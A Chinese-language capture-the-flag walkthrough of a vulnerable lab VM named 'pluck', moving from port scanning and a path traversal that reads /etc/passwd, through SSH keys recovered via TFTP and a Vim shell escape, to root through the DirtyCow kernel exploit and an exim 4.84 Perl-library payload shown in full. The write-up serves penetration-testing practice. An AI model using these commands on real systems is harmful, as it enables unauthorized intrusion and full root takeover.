如何搭建？vmware双击运行nat网卡即可！IP自动显示在项目环境界面！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.242 -p- -A

22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
5355/tcp open  llmnr?


--------------------------------------------
--------------------------------------------
2、nikto漏扫

nikto -h http://192.168.253.242/
/index.php?page=../../../../../../../../../../etc/passwd


http://192.168.253.242/index.php?page=../../../../../../../../../../etc/passwd

最后发现提示：
backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh

backup-user:x:1003:1003是备份文件？查看下/usr/local/scripts/backup.sh信息：

http://192.168.253.242/index.php?page=../../../../../../../../../../usr/local/scripts/backup.sh

---------
#!/bin/bash ######################## # Server Backup script # ######################## #Backup directories in /backups so we can get it via tftp echo "Backing up data" tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null echo "Backup complete" 
---------

了解到该服务器通过 TFTP 对其文件进行备份，生成的文件是“backup.tar”
现在使用 TFTP下载此文件：

tftp 192.168.253.242
tftp> get backup.tar
Received 1824718 bytes in 2.1 seconds
成功下载！

解压：
tar -xvf backup.tar
tree home   ---发现存在很多key文件！

此文件包含用户“Paul”的一些SSH密钥，更改权限并一一尝试：

ssh paul@192.168.253.242 -i id_key4
执行后会弹出一个界面：
选择Edit file

发现自己在Vim中，可以从Vim退出到shell，只需输入：
:set shell=/bin/bash
:shell
就能进入shell-ssh界面！


内部信息收集

1）Linux version 4.8.0-22-generic

2）find / -perm -4000 2>/dev/null
发现：/usr/exim/bin/exim-4.84-7



提权：

方法一：
Linux version 4.8.0-22-generic找到40616（CVE-2016-5195）

cp /usr/share/exploitdb/exploits/linux/local/40616.c .

上传文件后：
gcc 40616.c -o dayu -pthread
chmod +x dayu
./dayu

------
paul@pluck:/tmp$ ./dayu
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 54256
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd is overwritten
Popping root shell.
Don't forget to restore /tmp/bak
root@pluck:/tmp# id
uid=0(root) gid=1002(paul) groups=1002(paul)
------
成功获得root权限！   ----注意这个内核方法攻击后几十秒系统直接崩溃！


方法二：
/usr/exim/bin/exim-4.84-7

searchsploit exim 4.84
发现：linux/local/39535.sh
cp /usr/share/exploitdb/exploits/linux/local/39535.sh .

查看后发现payload：

----------
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;
system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim-4.84-7 -ps
----------
成功获得root权限！




































































































































